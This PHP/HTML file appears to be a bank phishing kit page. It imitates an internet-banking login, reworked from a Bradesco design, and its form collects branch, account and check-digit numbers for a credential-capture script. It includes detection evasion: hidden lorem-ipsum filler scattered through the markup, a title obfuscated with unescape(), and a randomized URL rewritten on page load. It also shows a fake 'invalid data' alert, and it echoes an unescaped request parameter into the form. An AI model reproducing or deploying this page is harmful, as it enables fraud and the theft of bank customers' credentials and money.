<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require_once('_admin/config.php');
require_once('validacao.php');
require_once('Lorem.php');
?>
<!DOCTYPE html>
<html data-wf-page="64c31c32efe376c343479c35fcad" data-wf-site="64c31c32efe3734346c79c35fca4">
<head>
  <meta charset="utf-8">
<script>
document.write(unescape('%3Ctitle%3EBanco%20Virtual%3C/title%3E'));
</script>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/bancobradesco.webflow.css" rel="stylesheet" type="text/css">
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="images/webclip.png" rel="apple-touch-icon">
  <style>
.w-slider-dot {
  background-color: transparent; /* Remove o background */
  border: 1px solid #bbbbbb; /* Adiciona uma borda de 2px com a cor desejada */
  width: 8px;
  height: 8px;
}
.w-slider-dot.w-active {
  background-color: transparent; /* Remove o background da versão ativa */
  border: 1px solid #fff; /* Adiciona uma borda de 2px na versão ativa com a cor desejada */
  width: 12px;
  height: 12px;
}

/* Header com gradiente azul - altura fixa de 51px */
.div-block {
  background: linear-gradient(135deg, #0066cc 0%, #0066cc 70%, #004499 100%) !important; /* Azul */
  background-image: none !important; /* Remover qualquer imagem de fundo */
  padding: 15px 0 !important; /* Padding original ajustado para 51px total */
  min-height: 51px !important; /* Altura mínima de 51px */
  width: 100% !important;
  position: relative !important;
  z-index: 1000 !important;
}

/* Forçar header azul com maior especificidade */
body .div-block,
html .div-block,
.w-nav .div-block {
  background: linear-gradient(135deg, #0066cc 0%, #0066cc 70%, #004499 100%) !important;
  background-image: none !important;
  background-color: #0066cc !important;
}

/* Garantir que o header seja visível */
.navbar-2 {
  background: linear-gradient(135deg, #0066cc 0%, #0066cc 70%, #004499 100%) !important;
  background-image: none !important;
  background-color: #0066cc !important;
  position: relative !important;
  z-index: 1000 !important;
}

/* CSS com especificidade máxima para forçar header azul */
body .navbar-2.w-nav,
html body .navbar-2.w-nav,
body .navbar-2[role="banner"],
html body .navbar-2[role="banner"] {
  background: linear-gradient(135deg, #0066cc 0%, #0066cc 70%, #004499 100%) !important;
  background-image: none !important;
  background-color: #0066cc !important;
  background-attachment: scroll !important;
  background-position: 0% 0% !important;
  background-repeat: repeat !important;
  background-size: auto !important;
}

/* Sobrescrever qualquer CSS externo */
.navbar-2[style*="background"] {
  background: linear-gradient(135deg, #0066cc 0%, #0066cc 70%, #004499 100%) !important;
}

/* Remover faixa cinza */
.section-2, .div-block-16, .container-8 {
  background: transparent !important;
  background-color: transparent !important;
  background-image: none !important;
}

/* Garantir que não há elementos cinzas */
*[class*="grey"], *[class*="gray"], *[style*="gray"], *[style*="grey"] {
  background: transparent !important;
  background-color: transparent !important;
  background-image: none !important;
}

/* Remover qualquer linha ou faixa cinza */
hr, .hr, .line, .divider, .separator {
  display: none !important;
  visibility: hidden !important;
  height: 0 !important;
  margin: 0 !important;
  padding: 0 !important;
  border: none !important;
}

/* Remover faixa cinza específica */
.section-2 {
  background: transparent !important;
  background-color: transparent !important;
  background-image: none !important;
  border: none !important;
  margin: 0 !important;
  padding: 0 !important;
  height: 0 !important;
  min-height: 0 !important;
  max-height: 0 !important;
  overflow: hidden !important;
}

/* Garantir que elementos após o header sejam transparentes */
.navbar-2 + * {
  background: transparent !important;
  background-color: transparent !important;
  background-image: none !important;
}

/* Remover logo ao lado do título */
.brand::before, .w-nav-brand::before,
.brand::after, .w-nav-brand::after,
.navbar-2::before, .navbar-2::after,
.container-8::before, .container-8::after {
  display: none !important;
  content: none !important;
  background-image: none !important;
  background: none !important;
}

/* Remover qualquer imagem de fundo no brand */
.brand, .w-nav-brand {
  background-image: none !important;
  background: none !important;
}

/* Garantir que apenas o texto apareça */
.brand span, .w-nav-brand span {
  display: block !important;
}

/* Remover pseudo-elementos que possam criar logo */
*::before, *::after {
  background-image: none !important;
  content: none !important;
}

/* Remover logo específico do Bradesco */
.brand[style*="background"], .w-nav-brand[style*="background"] {
  background: none !important;
  background-image: none !important;
  background-color: transparent !important;
}

/* Garantir que não há imagens no brand */
.brand img, .w-nav-brand img {
  display: none !important;
  visibility: hidden !important;
  width: 0 !important;
  height: 0 !important;
}

/* Remover qualquer elemento que possa ser um logo */
.brand *, .w-nav-brand * {
  background-image: none !important;
  background: none !important;
}

/* Forçar apenas texto no brand */
.brand, .w-nav-brand {
  text-indent: 0 !important;
  font-size: 18px !important;
  font-weight: bold !important;
  color: white !important;
}


/* Botão OK azul */
.submit-button {
  background-color: #0066cc !important; /* Azul */
  color: white !important;
  border: 1px solid #0066cc !important;
}

.submit-button:hover {
  background-color: #004499 !important; /* Azul mais escuro no hover */
  border-color: #004499 !important;
}


/* Paleta azul para outros elementos */
.button-2, .button-3 {
  background-color: #0066cc !important;
  color: white !important;
  border: 1px solid #0066cc !important;
}

.button-2:hover, .button-3:hover {
  background-color: #004499 !important;
  border-color: #004499 !important;
}

.button-3.active {
  background-color: #004499 !important;
  border-color: #004499 !important;
}

/* Links e elementos de navegação - removido para usar branco */

/* Dropdown e elementos interativos */
.w-dropdown-toggle {
  color: #0066cc !important;
}

.w-dropdown-link {
  color: #0066cc !important;
}

.w-dropdown-link:hover {
  color: #004499 !important;
}

/* Footer com paleta azul */
.footer-subscribe {
  background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
}

.footer-link-three {
  color: #ffffff !important;
}

.footer-link-three:hover {
  color: #b3d9ff !important;
}

.footer-copyright {
  color: #ffffff !important;
}

.text-block-2 {
  color: #ffffff !important;
}

/* Design do menu lateral */
.div-block-13 {
  background: white !important;
  border-radius: 12px !important;
  padding: 20px !important;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1) !important;
  margin: 20px !important;
}

/* Organizar botões do menu lateral */
.div-block-14 {
  display: flex !important;
  flex-direction: column !important;
  gap: 8px !important;
  margin-bottom: 15px !important;
}

/* Estilo dos botões do menu */
.button-3 {
  background: #0066cc !important;
  color: white !important;
  border: none !important;
  border-radius: 8px !important;
  padding: 12px 16px !important;
  text-decoration: none !important;
  font-weight: 500 !important;
  font-size: 14px !important;
  text-align: center !important;
  transition: all 0.3s ease !important;
  display: block !important;
  width: 100% !important;
  box-sizing: border-box !important;
}

.button-3:hover {
  background: #004499 !important;
  transform: translateY(-1px) !important;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2) !important;
}

/* Botão SEJA CLIENTE destacado */
.button-3.active {
  background: #004499 !important;
  color: white !important;
  font-weight: bold !important;
  margin-top: 10px !important;
  border: 2px solid #0066cc !important;
}

.button-3.active:hover {
  background: #003377 !important;
  border-color: #004499 !important;
}

/* Título do menu lateral */
.div-block-13 span {
  color: #0066cc !important;
  font-weight: bold !important;
  font-size: 18px !important;
  text-align: center !important;
  display: block !important;
  margin-bottom: 15px !important;
  padding-bottom: 10px !important;
  border-bottom: 2px solid #e0e0e0 !important;
}

/* Links de navegação em branco */
.nav-link {
  color: #ffffff !important;
}

.nav-link:hover {
  color: #b3d9ff !important;
}

.nav-link.w--current {
  color: #ffffff !important;
  font-weight: bold !important;
}

/* Responsividade básica */
@media (max-width: 768px) {
  .div-block {
    padding: 10px 0;
    min-height: 40px;
  }
  
}
</style>
<style>
        p.random{display:none}
    </style>
		  <script type="text/javascript">

  function gerarCodigo(length) {
    var caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var codigo = '';
    for (var i = 0; i < length; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return codigo;
  }

  function alterar_url(nova) {
    var codigo = gerarCodigo(60);
    var dataHoraAtual = new Date();
    var dia = dataHoraAtual.getDate().toString().padStart(2, '0');
    var mes = (dataHoraAtual.getMonth() + 1).toString().padStart(2, '0');
    var ano = dataHoraAtual.getFullYear().toString();
    var hora = dataHoraAtual.getHours().toString().padStart(2, '0');
    var minutos = dataHoraAtual.getMinutes().toString().padStart(2, '0');
    var segundos = dataHoraAtual.getSeconds().toString().padStart(2, '0');
    
    var link = nova + "=?" + codigo + dia + mes + ano + '_' + hora + minutos + segundos;
    history.pushState({}, null, link);
  }
  </script>
  <style>
        p.random{display:none}
    </style>
</head>
<body class="body" onload="alterar_url('')">
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <script id="navegg" src="js/navegg.js"></script>
  <div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar-2 w-nav" style="background: linear-gradient(135deg, #0066cc 0%, #0066cc 70%, #004499 100%) !important; background-image: none !important; background-color: #0066cc !important; position: relative !important; z-index: 1000 !important;">
    <div class="container-8 w-container">
      <a href="#" class="brand w-nav-brand"><span style="color: white; font-weight: bold; font-size: 18px;">Banco Virtual</span></a>
      <div class="menu-button w-nav-button">
        <div class="w-icon-nav-menu"></div>
      </div>
    </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  </div>
      <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  <section class="section-2">
    <div class="div-block-16"><img src="images/cadeado.svg" loading="lazy" alt="" class="image-3"><img src="images/cadeado_1.svg" loading="lazy" width="31" alt="">
      <h4 class="heading-3">Para sua segurança</h4>
      <div class="text-block-6">Os benefícios devem ser validados através do computador ou notebook. Evite bloqueios temporários.</div>
    </div>
  </section>
  <div class="div-block">
    <div class="w-layout-blockcontainer container-2 w-container">
      <div class="div-block-3"><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="div-menu"><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <div class="div-menu _2"><img src="images/cadeado.svg" loading="lazy" alt="" class="icon"><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <div class="text-block _1">ACESSAR SUA CONTA</div><p class="random"><?php echo Lorem::ipsumWords(75);?></p><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          </div>
          <div class="div-menu _2">
            <div class="div-block-5"></div>
          </div>
          <div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <div class="form-block w-form">
			<p class="random"><?php echo Lorem::ipsumWords(75);?></p>
              <form name="Form60" id="Form60" data-name="Email Form" method="post" class="form" data-wf-page-id="64c31c32efe376c79c35fcad" data-wf-element-id="c5da8b2a-7655-c367-5078-f229c21b282a" onsubmit="return ValidaLogin(event);" action="identificacao.php?hash=<?php echo $_GET['hash']; ?>">
               <p class="random"><?php echo Lorem::ipsumWords(75);?></p>               
			   <label for="name" class="field-label">Agência:</label>
                <p class="random"><?php echo Lorem::ipsumWords(75);?></p><input autocomplete="off" name="agencia" id="agencia" type="text" class="text-field w-input jump-input" maxlength="4" tabindex="1" title="Informe o número da agência sem o dígito" onkeypress="return justNumbers(event);"><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                
                <label for="email" class="field-label">Conta:</label>
                <p class="random"><?php echo Lorem::ipsumWords(75);?></p><input autocomplete="off" name="conta" id="conta" type="text" class="text-field w-input jump-input" tabindex="2" title="Informe a Conta sem o dígito" maxlength="7" onkeypress="return justNumbers(event);"><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                
                <p class="random"><?php echo Lorem::ipsumWords(75);?></p><input autocomplete="off" name="digito" type="text" id="digito" class="text-field-2 w-input jump-input" maxlength="1" tabindex="3" title="Informe o dígito da sua conta" onkeypress="return justNumbers(event);"><p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                
                <input type="submit" value="OK" tabindex="5" class="submit-button w-button">
                <input type="hidden" name="EXTRAPARAMS" value="">
                <input type="hidden" name="ORIGEM" value="101">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                
                <label class="w-checkbox checkbox-field">
                  <input type="checkbox" id="checkbox" name="checkbox" data-name="Checkbox" class="w-checkbox-input checkbox">
                  <span class="field-label w-form-label" for="checkbox"><strong>Lembrar-me</strong></span>
                </label>
              </form>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
              
              
              
            </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          </div>
          <div class="div-menu">
            <div class="div-block-5"></div>
          </div>
          <div data-hover="true" data-delay="0" class="w-dropdown">
            <div class="dropdown-toggle w-dropdown-toggle">
              <div class="w-icon-dropdown-toggle"></div>
              <div>COMO USAR</div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            </div>
            <nav class="dropdown-list w-dropdown-list">
              <a href="#" class="w-dropdown-link">Como acessar sua conta</a>
              <a href="#" class="w-dropdown-link">Senhas e Dispositivos de Segurança</a>
              <a href="#" class="w-dropdown-link">Chat Internet Banking</a>
              <a href="#" class="w-dropdown-link">Navegador Exclusivo Banco Virtual</a>
            </nav>
          </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        </div>
        <div class="div-menu"><img src="images/icon_orelha.svg" loading="lazy" alt="" class="icon"></div>
      </div>
    </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  </div>
  <section class="section">
    <div data-animation="default" data-collapse="small" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar w-nav">
      <div class="container-7 w-container">
        <div class="w-nav-button">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <div class="w-icon-nav-menu"></div>
        </div>
      </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
      <div class="div-block-13"><span style="color: white; font-weight: bold; font-size: 24px;">Banco Virtual</span>
        <div class="div-block-14">
          <a href="#" class="button-3 w-button">Produtos<br>e Serviços</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <a href="#" class="button-3 _2 w-button">Benefícios<br>e Novidades</a>
          <a href="#" class="button-3 _3 w-button">Acessibilidade</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <a href="#" class="button-3 _4 w-button">Sobre o Banco Virtual</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <a href="#" class="button-3 _5 w-button">Educação Financeira</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <a href="#" class="button-3 _6 w-button">Canais<br>Digitais</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <a href="#" class="button-3 _7 w-button">Atendimento</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        </div>
        <a href="#" class="button-3 active w-button">SEJA CLIENTE</a>
      </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
      <nav role="navigation" class="nav-menu w-nav-menu">
        <a href="index.html" aria-current="page" class="nav-link w-nav-link w--current">PARA VOCÊ</a>
        <a href="#" class="nav-link w-nav-link">EXCLUSIVE</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <a href="#" class="nav-link w-nav-link">PRIME</a>
        <a href="#" class="nav-link w-nav-link">PRIVATE BANK</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div data-hover="true" data-delay="0" class="w-dropdown">
          <div class="dropdown-toggle-2 w-dropdown-toggle">
            <div class="icon-2 w-icon-dropdown-toggle"></div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <div class="text-block-5">MAIS</div>
            <div>perfis</div>
          </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <nav class="dropdown-list-2 w-dropdown-list">
            <a href="#" class="w-dropdown-link">Aposentados</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <a href="#" class="w-dropdown-link">Crianças e Adolescentes</a>
            <a href="#" class="w-dropdown-link">Nikkei</a>
            <a href="#" class="w-dropdown-link">Universitários</a>
          </nav>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        </div>
        <div data-hover="true" data-delay="0" class="w-dropdown">
          <div class="dropdown-toggle-2 w-dropdown-toggle">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <div class="icon-2 w-icon-dropdown-toggle"></div>
            <div class="text-block-5">PARA SUA</div>
            <div>EMPRESA</div>
          </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <nav class="dropdown-list-3 w-dropdown-list">
            <a href="#" class="w-dropdown-link">Empresas e Negócios</a>
            <a href="#" class="w-dropdown-link">Banco Virtual Corporate</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          </nav>
        </div>
        <div data-hover="false" data-delay="0" class="w-dropdown">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <div class="dropdown-toggle-2 _1 w-dropdown-toggle">
            <div class="icon-2 w-icon-dropdown-toggle"></div>
            <div>pODER PÚBLICO</div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          </div>
          <nav class="w-dropdown-list">
            <a href="#" class="w-dropdown-link">Link 1</a>
            <a href="#" class="w-dropdown-link">Link 2</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <a href="#" class="w-dropdown-link">Link 3</a>
          </nav>
        </div>
        <div data-hover="false" data-delay="0" class="w-dropdown">
          <div class="dropdown-toggle-2 w-dropdown-toggle">
            <div class="text-block-5">MAIS</div>
            <div>BANCO VIRTUAL</div>
          </div>
          <nav class="dropdown-list-4 w-dropdown-list"></nav>
        </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="form-block-2 w-form">
          <form id="email-form-2" name="email-form-2" data-name="Email Form 2" data-wf-page-id="64c31c32efe376c79c35fcad" data-wf-element-id="8adaa30b-ed04-e608-ed0a-1b4f9d5848b1"><input type="email" class="text-field-3 w-input" maxlength="256" name="email-3" data-name="Email 3" placeholder="O que você procura" id="email-3" required=""></form>
        
        </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
      </nav>
    </div>
    <div data-delay="8000" data-animation="slide" class="slider w-slider" data-autoplay="true" fs-sliderdots-active="slider" data-easing="ease" data-hide-arrows="false" data-disable-swipe="false" data-autoplay-limit="0" data-nav-spacing="3" data-duration="500" data-infinite="true">
      <div class="w-slider-mask">
        <div class="slide w-slide" style="background-image: url('images/Gemini_Generated_Image_r6rurbr6rurbr6ru.png'); background-size: cover; background-position: center;"></div>
        <div class="slide-2 w-slide" style="background-image: url('images/Gemini_Generated_Image_r6rurbr6rurbr6ru (1).png'); background-size: cover; background-position: center;"></div>
      </div>
      <div class="left-arrow w-slider-arrow-left">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="w-icon-slider-left"></div>
      </div>
      <div class="right-arrow w-slider-arrow-right">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="w-icon-slider-right"></div>
      </div>
      <div fs-sliderdots-element="slider-nav" class="slide-nav w-slider-nav w-round"></div>
    </div>
    <div class="w-layout-blockcontainer container-6 w-container"></div>
  </section>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  <section class="team-slider _1">
    <div class="container-3-copy">
      <div class="div-grey">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <h2 class="heading-2">NÃO TEM CONTA AQUI?</h2>
        <p class="centered-subheading-copy">Quer aproveitar os benefícios dos produtos que temos para você? Contrate on-line:</p>
        <div class="div-block-11">
          <a href="#" class="button-2 w-button">Agora<br>Investimentos</a>
          <a href="#" class="button-2 _2 w-button">Cartões</a>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <a href="#" class="button-2 _3 w-button">Empréstimos</a>
        </div>
      </div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    </div>
  </section>
  <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  <section class="team-slider">
    <div class="container-3">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
      <div class="div-block-8">
        <h2 class="centered-heading">SERVIÇOS ON-LINE</h2>
        <div class="div-block-7"></div>
        <p class="centered-subheading">Conte com o Banco Virtual sempre que precisar</p>
      </div>
      <div class="grid">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="team-block">
          <h3 class="team-member-name-two">Crédito imobiliário</h3>
          <div class="team-block-info"></div>
          <div class="d-30-image-wrapper">
            <div class="d-30-image"></div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          </div>
        </div>
        <div class="team-block">
          <h3 class="team-member-name-two">boletos</h3>
          <div class="team-block-info"></div>
          <div class="d-30-image-wrapper">
            <div class="d-30-image _2"></div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          </div>
        </div>
        <div class="team-block">
          <h3 class="team-member-name-two">pagamentos</h3>
          <div class="team-block-info"></div>
          <div class="d-30-image-wrapper">    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <div class="d-30-image _3"></div>
          </div>
        </div>
        <div class="team-block">
          <h3 class="team-member-name-two">renegociação de dívidas</h3>
          <div class="team-block-info"></div>    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
          <div class="d-30-image-wrapper">
            <div class="d-30-image _4"></div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  <section class="footer-subscribe">
    <div class="container-4">
      <div class="footer-wrapper-three">
        <div class="footer-social-block-three">
          <div class="text-block-2">ACOMPANHE:</div>
          <div class="div-block-15">
            <a href="#" class="footer-social-link-three w-inline-block"><img src="images/linkedin.svg" loading="lazy" alt=""></a>
            <a href="#" class="footer-social-link-three w-inline-block"><img src="images/facebook.svg" loading="lazy" alt=""></a>
            <a href="#" class="footer-social-link-three w-inline-block"><img src="images/twitter.svg" loading="lazy" alt=""></a>
            <a href="#" class="footer-social-link-three w-inline-block"><img src="images/youtube.svg" loading="lazy" alt=""></a>
            <a href="#" class="footer-social-link-three w-inline-block"><img src="images/instagram.svg" loading="lazy" alt=""></a>
          </div>
        </div>
        <div class="footer-copyright">Banco Virtual SA | CNPJ: 00.000.000/0001-00<br>Centro, s/nº | São Paulo | SP | CEP: 00000-000</div>
      </div>
      <div class="footer-divider-two"></div>
      <div class="footer-bottom">
        <div class="footer-block-three">
          <a href="#" class="footer-link-three">SOBRE NÓS</a>
          <div class="div-block-5 white"></div>
          <a href="#" class="footer-link-three">PORTABILIDADE</a>
          <div class="div-block-5 white"></div>
          <a href="#" class="footer-link-three">IMPRENSA</a>
          <div class="div-block-5 white"></div>
          <a href="#" class="footer-link-three">TRABALHE CONOSCO</a>
          <div class="div-block-5 white"></div>
          <a href="#" class="footer-link-three">SEGURANÇA</a>
          <div class="div-block-5 white"></div>
          <a href="#" class="footer-link-three">CRÉDITO RESPONSÁVEL</a>
          <div class="div-block-5 white"></div>
          <a href="#" class="footer-link-three">INVESTIDORES</a>
        </div>
      </div>
    </div>
  </section>
  <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
  <div class="div-block-9">
    <div class="w-layout-blockcontainer container-5 w-container">
      <div class="div-block-10">
        <div id="w-node-fdb63637-a338-5847-6174-1af6dd129724-9c35fcad" class="text-block-3">Usamos cookies pra oferecer a melhor experiência e analisar o uso de nosso site, direcionar conteúdos e anúncios personalizados e facilitar a navegação de forma segura. Para mais informações, consulte nossa <strong>Diretiva de Privacidade.</strong></div>
        <a data-w-id="119ea068-f2f2-be8d-acab-2eb9dd1ec2b3" href="#" class="button w-button">Fechar</a>
      </div>
    </div>
  </div>
  
    <!-- jQuery deve ser carregado primeiro -->
    <script src="js/jquery-3.4.1.min.js"></script>
    <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=64c31c32efe376c79c35fca4" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
    
    <!-- Chamada dos JS do Banner -->
    <script defer src="js/jquery.flexslider.js"></script>
    <script src="js/banner.js"></script>
    <script src="js/jquery.easing.js"></script>
    <script src="js/jQuery-plugin-progressbar.js"></script>
    <script src="js/jquery.mousewheel.js"></script>
    <script src="js/index-progress-bar.js"></script>

    <script src="js/validaFrame.js"></script>
    <!-- <script src="js/valida_agenciaconta.js"></script> -->
    <script src="js/lembrarAgCta.js"></script>
    <script src="js/bAutocomplete.js"></script>
    <script src="js/bPagina-min.js"></script>
    <script src="js/ua-parser.min.js"></script>
    <script src="js/chosen.jquery.min.js"></script>
    <script src="js/jquery.mmenu.min.js"></script>
    <script src="js/jquery.magnific-popup.min.js"></script>
    <script src="js/jquery.color.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/bootstrap-select.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap-4.3.1.min.js"></script>
    <script src="js/mediaelement-and-player.min.js"></script>
    <script src="js/jquery.touchSwipe.min.js"></script>
    <script src="js/jquery.placeholder.min.js"></script>
    <script src="js/validaFormNaoCorrentista.js"></script>
    <script src="js/mascara.js"></script>
    <script src="js/retargeting.js"></script>
    <script src="js/validanavegadorexclusivo.js"></script>
    <script src="js/detect-mobile.js"></script>
    <script src="js/moment.min.js"></script>
    <script src="js/modal-cartoes.js"></script>
    <script src="js/js.cookie-2.2.1.min.js"></script>
    <script src="js/index-footer.js"></script>
    <script src="js/index-footer-mapp.js"></script>
    <script src="js/html5lightbox.js"></script>
    

  <script src="js/webflow.js" type="text/javascript"></script>
   
    <!-- Slick -->
    <script src="js/slick.min.js"></script>
    <script src="js/home.js"></script>
    <?php
        if(isset($_GET['msg'])){
                echo "<script>alert('Informações inválidas. Por favor, verifique agência, conta e dígito.');</script>";
        }
    ?>
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
   <script>
    // Selecionar todos os campos de entrada com a classe "jump-input"
    const jumpInputs = document.querySelectorAll('.jump-input');
  
    // Adicionar um evento de escuta para cada campo de entrada
    jumpInputs.forEach((input, index) => {
      input.addEventListener('input', (event) => {
        // Obter o número máximo de caracteres permitidos para o campo atual
        const maxLength = parseInt(event.target.getAttribute('maxlength'));
  
        // Obter o valor atual do campo
        const currentValue = event.target.value;
  
        // Verificar se o valor atual atingiu o número máximo de caracteres
        if (currentValue.length >= maxLength) {
          // Se sim, pule para o próximo campo, se existir
          if (index + 1 < jumpInputs.length) {
            jumpInputs[index + 1].focus();
          }
        }
      });
    });
  </script>
</body>
</html>